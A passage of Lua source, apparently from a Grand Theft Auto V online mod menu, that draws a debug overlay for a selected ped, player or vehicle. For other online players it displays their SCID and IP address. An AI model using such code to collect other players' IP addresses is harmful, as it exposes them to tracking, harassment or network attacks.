				ui.draw_text("Model: " .. PedModel.get_ped_model_from_hash(entity.get_entity_model_hash(entity_debug_info_entity)) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.59 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Mission Entity: " .. tostring(natives.IS_ENTITY_A_MISSION_ENTITY(entity_debug_info_entity)) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.61 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Scripted: " .. tostring(memory.is_script_entity(entity_debug_info_entity)) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.63 + feature["Debug Info Text Y Offset"].value))
				local entity_owner = memory.get_entity_owner(entity_debug_info_entity)
				if entity_owner ~= nil and player.get_player_name(entity_owner) ~= nil then
					ui.set_text_scale(feature["Debug Info Text Size 1"].value)
					ui.set_text_font(feature["Debug Info Text Font 1"].value)
					ui.set_text_outline(true)
					ui.set_text_color(255, 255, 255, 255)
					ui.draw_text("Owner: " .. tostring(player.get_player_name(entity_owner)) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.65 + feature["Debug Info Text Y Offset"].value))
				else
					ui.set_text_scale(feature["Debug Info Text Size 1"].value)
					ui.set_text_font(feature["Debug Info Text Font 1"].value)
					ui.set_text_outline(true)
					ui.set_text_color(255, 255, 255, 255)
					ui.draw_text("Owner: -", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.65 + feature["Debug Info Text Y Offset"].value))
				end
				local entity_creator = memory.get_entity_creator(entity_debug_info_entity)
				if entity_creator ~= nil and player.get_player_name(entity_creator) ~= nil then
					ui.set_text_scale(feature["Debug Info Text Size 1"].value)
					ui.set_text_font(feature["Debug Info Text Font 1"].value)
					ui.set_text_outline(true)
					ui.set_text_color(255, 255, 255, 255)
					ui.draw_text("Creator: " .. tostring(player.get_player_name(entity_creator)) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.67 + feature["Debug Info Text Y Offset"].value))
				else
					ui.set_text_scale(feature["Debug Info Text Size 1"].value)
					ui.set_text_font(feature["Debug Info Text Font 1"].value)
					ui.set_text_outline(true)
					ui.set_text_color(255, 255, 255, 255)
					ui.draw_text("Creator: -", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.67 + feature["Debug Info Text Y Offset"].value))
				end
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("L - Get Oufit Components", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.71 + feature["Debug Info Text Y Offset"].value))
				if controls.is_disabled_control_just_pressed(0, 182) then
					if ped.get_ped_prop_index(entity_debug_info_entity, 0) == 4294967295 or ped.get_ped_prop_index(entity_debug_info_entity, 1) == 4294967295 or ped.get_ped_prop_index(entity_debug_info_entity, 2) == 4294967295 then
						menu.notify("Index 0: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 0) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 0) .. "\nIndex 1: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 1) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 1) .. "\nIndex 2: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 2) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 2) .. "\nIndex 3: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 3) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 3) .. "\nIndex 4: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 4) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 4) .. "\nIndex 5: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 5) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 5) .. "\nIndex 6: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 6) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 6) .. "\nIndex 7: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 7) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 7) .. "\nIndex 8: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 8) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 8) .. "\nIndex 9: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 9) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 9) .. "\nIndex 10: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 10) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 10) .. "\nIndex 11: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 11) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 11) .. "\n\nIndex 0: 0 | " .. ped.get_ped_prop_texture_index(entity_debug_info_entity, 0) .. "\nIndex 1: 0 | " .. ped.get_ped_prop_texture_index(entity_debug_info_entity, 1) .. "\nIndex 2: 0 | " .. ped.get_ped_prop_texture_index(entity_debug_info_entity, 2) .. "")
					else
						menu.notify("Index 0: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 0) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 0) .. "\nIndex 1: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 1) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 1) .. "\nIndex 2: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 2) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 2) .. "\nIndex 3: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 3) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 3) .. "\nIndex 4: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 4) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 4) .. "\nIndex 5: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 5) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 5) .. "\nIndex 6: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 6) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 6) .. "\nIndex 7: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 7) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 7) .. "\nIndex 8: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 8) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 8) .. "\nIndex 9: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 9) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 9) .. "\nIndex 10: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 10) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 10) .. "\nIndex 11: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 11) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 11) .. "\n\nIndex 0: " .. ped.get_ped_prop_index(entity_debug_info_entity, 0) .. " | " .. ped.get_ped_prop_texture_index(entity_debug_info_entity, 0) .. "\nIndex 1: " .. ped.get_ped_prop_index(entity_debug_info_entity, 1) .. " | " .. ped.get_ped_prop_texture_index(entity_debug_info_entity, 1) .. "\nIndex 2: " .. ped.get_ped_prop_index(entity_debug_info_entity, 2) .. " | " .. ped.get_ped_prop_texture_index(entity_debug_info_entity, 2) .. "")
					end
				end
			elseif entity.is_entity_a_ped(entity_debug_info_entity) and not ped.is_ped_in_any_vehicle(entity_debug_info_entity) and ped.is_ped_a_player(entity_debug_info_entity) then
				local player_debug_info_entity = player.get_player_from_ped(entity_debug_info_entity)
				ui.set_text_scale(feature["Debug Info Text Size 2"].value)
				ui.set_text_font(feature["Debug Info Text Font 2"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Player", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.5 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Name: " .. player_func.get_player_flag_string(player_debug_info_entity) .. " " .. tostring(player.get_player_name(player_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.53 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("ID: " .. player_debug_info_entity .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.55 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("SCID: " .. player.get_player_scid(player_debug_info_entity) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.57 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("IP: " .. utilities.dec_to_ipv4(player.get_player_ip(player_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.59 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Health: " .. text_func.round(player.get_player_health(player_debug_info_entity)) .. "/" .. text_func.round(player.get_player_max_health(player_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.61 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("God: " .. tostring(player.is_player_god(player_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.63 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Position: " .. text_func.round_two_dc(entity.get_entity_coords(entity_debug_info_entity).x) .. ", " .. text_func.round_two_dc(entity.get_entity_coords(entity_debug_info_entity).y) .. ", " .. text_func.round_two_dc(entity.get_entity_coords(entity_debug_info_entity).z) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.53 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Rotation: " .. text_func.round_two_dc(entity.get_entity_rotation(entity_debug_info_entity).x) .. ", " .. text_func.round_two_dc(entity.get_entity_rotation(entity_debug_info_entity).y) .. ", " .. text_func.round_two_dc(entity.get_entity_rotation(entity_debug_info_entity).z) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.55 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Heading: " .. text_func.round_two_dc(entity.get_entity_heading(entity_debug_info_entity)) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.57 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Mission Entity: " .. tostring(natives.IS_ENTITY_A_MISSION_ENTITY(entity_debug_info_entity)) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.59 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Scripted: " .. tostring(memory.is_script_entity(entity_debug_info_entity)) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.61 + feature["Debug Info Text Y Offset"].value))
				local entity_owner = memory.get_entity_owner(entity_debug_info_entity)
				if entity_owner ~= nil and player.get_player_name(entity_owner) ~= nil then
					ui.set_text_scale(feature["Debug Info Text Size 1"].value)
					ui.set_text_font(feature["Debug Info Text Font 1"].value)
					ui.set_text_outline(true)
					ui.set_text_color(255, 255, 255, 255)
					ui.draw_text("Owner: " .. tostring(player.get_player_name(entity_owner)) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.63 + feature["Debug Info Text Y Offset"].value))
				else
					ui.set_text_scale(feature["Debug Info Text Size 1"].value)
					ui.set_text_font(feature["Debug Info Text Font 1"].value)
					ui.set_text_outline(true)
					ui.set_text_color(255, 255, 255, 255)
					ui.draw_text("Owner: -", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.63 + feature["Debug Info Text Y Offset"].value))
				end
				local entity_creator = memory.get_entity_creator(entity_debug_info_entity)
				if entity_creator ~= nil and player.get_player_name(entity_creator) ~= nil then
					ui.set_text_scale(feature["Debug Info Text Size 1"].value)
					ui.set_text_font(feature["Debug Info Text Font 1"].value)
					ui.set_text_outline(true)
					ui.set_text_color(255, 255, 255, 255)
					ui.draw_text("Creator: " .. tostring(player.get_player_name(entity_creator)) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.65 + feature["Debug Info Text Y Offset"].value))
				else
					ui.set_text_scale(feature["Debug Info Text Size 1"].value)
					ui.set_text_font(feature["Debug Info Text Font 1"].value)
					ui.set_text_outline(true)
					ui.set_text_color(255, 255, 255, 255)
					ui.draw_text("Creator: -", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.65 + feature["Debug Info Text Y Offset"].value))
				end
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("L - Get Oufit Components", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.69 + feature["Debug Info Text Y Offset"].value))
				if controls.is_disabled_control_just_pressed(0, 182) then
					if ped.get_ped_prop_index(entity_debug_info_entity, 0) == 4294967295 or ped.get_ped_prop_index(entity_debug_info_entity, 1) == 4294967295 or ped.get_ped_prop_index(entity_debug_info_entity, 2) == 4294967295 then
						menu.notify("Index 0: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 0) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 0) .. "\nIndex 1: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 1) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 1) .. "\nIndex 2: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 2) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 2) .. "\nIndex 3: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 3) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 3) .. "\nIndex 4: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 4) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 4) .. "\nIndex 5: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 5) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 5) .. "\nIndex 6: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 6) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 6) .. "\nIndex 7: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 7) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 7) .. "\nIndex 8: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 8) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 8) .. "\nIndex 9: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 9) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 9) .. "\nIndex 10: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 10) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 10) .. "\nIndex 11: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 11) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 11) .. "\n\nIndex 0: 0 | " .. ped.get_ped_prop_texture_index(entity_debug_info_entity, 0) .. "\nIndex 1: 0 | " .. ped.get_ped_prop_texture_index(entity_debug_info_entity, 1) .. "\nIndex 2: 0 | " .. ped.get_ped_prop_texture_index(entity_debug_info_entity, 2) .. "")
					else
						menu.notify("Index 0: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 0) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 0) .. "\nIndex 1: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 1) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 1) .. "\nIndex 2: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 2) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 2) .. "\nIndex 3: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 3) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 3) .. "\nIndex 4: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 4) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 4) .. "\nIndex 5: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 5) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 5) .. "\nIndex 6: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 6) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 6) .. "\nIndex 7: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 7) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 7) .. "\nIndex 8: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 8) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 8) .. "\nIndex 9: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 9) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 9) .. "\nIndex 10: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 10) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 10) .. "\nIndex 11: " .. ped.get_ped_drawable_variation(entity_debug_info_entity, 11) .. " | " .. ped.get_ped_texture_variation(entity_debug_info_entity, 11) .. "\n\nIndex 0: " .. ped.get_ped_prop_index(entity_debug_info_entity, 0) .. " | " .. ped.get_ped_prop_texture_index(entity_debug_info_entity, 0) .. "\nIndex 1: " .. ped.get_ped_prop_index(entity_debug_info_entity, 1) .. " | " .. ped.get_ped_prop_texture_index(entity_debug_info_entity, 1) .. "\nIndex 2: " .. ped.get_ped_prop_index(entity_debug_info_entity, 2) .. " | " .. ped.get_ped_prop_texture_index(entity_debug_info_entity, 2) .. "")
					end
				end
			elseif entity.is_entity_a_ped(entity_debug_info_entity) and ped.is_ped_in_any_vehicle(entity_debug_info_entity) then
				local entity_debug_info_entity = ped.get_vehicle_ped_is_using(entity_debug_info_entity)
				ui.set_text_scale(feature["Debug Info Text Size 2"].value)
				ui.set_text_font(feature["Debug Info Text Font 2"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Vehicle", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.5 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Hash: " .. tostring(entity.get_entity_model_hash(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.53 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Health: " .. text_func.round(natives.GET_VEHICLE_BODY_HEALTH(entity_debug_info_entity)) .. "/1000", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.55 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Name: " .. tostring(vehicle.get_vehicle_model(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.57 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("God: " .. tostring(entity.get_entity_god_mode(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.59 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Visible: " .. tostring(entity.is_entity_visible(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.61 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Has Control: " .. tostring(network.has_control_of_entity(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.63 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Attached: " .. tostring(entity.is_entity_attached(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.65 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Dead: " .. tostring(entity.is_entity_dead(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.67 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Networked: " .. tostring(natives.NETWORK_GET_ENTITY_IS_NETWORKED(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.69 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Frozen: " .. tostring(memory.is_entity_frozen(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.71 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Net ID: " .. tostring(natives.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity_debug_info_entity)), v2(0.5 + feature["Debug Info Text X Offset"].value, 0.73 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Script ID: " .. tostring(natives.NETWORK_GET_ENTITY_NET_SCRIPT_ID(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.75 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Script Char: " .. tostring(natives.GET_ENTITY_SCRIPT(entity_debug_info_entity, 0)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.77 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Position: " .. text_func.round_two_dc(entity.get_entity_coords(entity_debug_info_entity).x) .. ", " .. text_func.round_two_dc(entity.get_entity_coords(entity_debug_info_entity).y) .. ", " .. text_func.round_two_dc(entity.get_entity_coords(entity_debug_info_entity).z) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.53 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Rotation: " .. text_func.round_two_dc(entity.get_entity_rotation(entity_debug_info_entity).x) .. ", " .. text_func.round_two_dc(entity.get_entity_rotation(entity_debug_info_entity).y) .. ", " .. text_func.round_two_dc(entity.get_entity_rotation(entity_debug_info_entity).z) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.55 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Heading: " .. text_func.round_two_dc(entity.get_entity_heading(entity_debug_info_entity)) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.57 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Model: " .. VehicleModel.get_vehicle_model_from_hash(entity.get_entity_model_hash(entity_debug_info_entity)) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.59 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Mission Entity: " .. tostring(natives.IS_ENTITY_A_MISSION_ENTITY(entity_debug_info_entity)) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.61 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Scripted: " .. tostring(memory.is_script_entity(entity_debug_info_entity)) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.63 + feature["Debug Info Text Y Offset"].value))
				local entity_owner = memory.get_entity_owner(entity_debug_info_entity)
				if entity_owner ~= nil and player.get_player_name(entity_owner) ~= nil then
					ui.set_text_scale(feature["Debug Info Text Size 1"].value)
					ui.set_text_font(feature["Debug Info Text Font 1"].value)
					ui.set_text_outline(true)
					ui.set_text_color(255, 255, 255, 255)
					ui.draw_text("Owner: " .. tostring(player.get_player_name(entity_owner)) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.65 + feature["Debug Info Text Y Offset"].value))
				else
					ui.set_text_scale(feature["Debug Info Text Size 1"].value)
					ui.set_text_font(feature["Debug Info Text Font 1"].value)
					ui.set_text_outline(true)
					ui.set_text_color(255, 255, 255, 255)
					ui.draw_text("Owner: -", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.65 + feature["Debug Info Text Y Offset"].value))
				end
				local entity_creator = memory.get_entity_creator(entity_debug_info_entity)
				if entity_creator ~= nil and player.get_player_name(entity_creator) ~= nil then
					ui.set_text_scale(feature["Debug Info Text Size 1"].value)
					ui.set_text_font(feature["Debug Info Text Font 1"].value)
					ui.set_text_outline(true)
					ui.set_text_color(255, 255, 255, 255)
					ui.draw_text("Creator: " .. tostring(player.get_player_name(entity_creator)) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.67 + feature["Debug Info Text Y Offset"].value))
				else
					ui.set_text_scale(feature["Debug Info Text Size 1"].value)
					ui.set_text_font(feature["Debug Info Text Font 1"].value)
